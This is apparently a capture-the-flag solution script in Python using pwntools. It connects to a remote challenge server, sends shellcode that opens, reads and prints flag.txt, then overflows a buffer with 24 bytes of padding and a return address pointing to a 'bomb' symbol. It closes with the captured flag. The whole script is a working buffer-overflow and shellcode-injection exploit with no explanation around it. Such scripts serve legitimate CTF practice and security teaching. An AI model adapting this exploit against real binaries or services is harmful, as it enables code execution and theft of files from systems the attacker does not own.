#!/usr/bin/python3

from pwn import *

#io = process("./chall")
io = remote("chall.nitdgplug.org", 30104)
elf = ELF("./chall")

context.clear(arch="amd64")

def craft_shellcode():
        shellcode = asm(shellcraft.linux.open("flag.txt"))
        shellcode += asm(shellcraft.linux.syscall("SYS_read", "rax", "rsp", 0x100))
        shellcode += asm(shellcraft.linux.syscall("SYS_write", 1, "rsp", "rax"))
        return shellcode


address = elf.sym.bomb

def main():
        log.info(io.recvline())
        shellcode = craft_shellcode()

        io.sendline(shellcode)
        io.recvline()

        io.sendline(b"A"*24 + p64(address))
        io.interactive()

if __name__ == "__main__":
        main()

# GLUG{0p3n_wr1t3_r34d_6894bf818e81f42c}
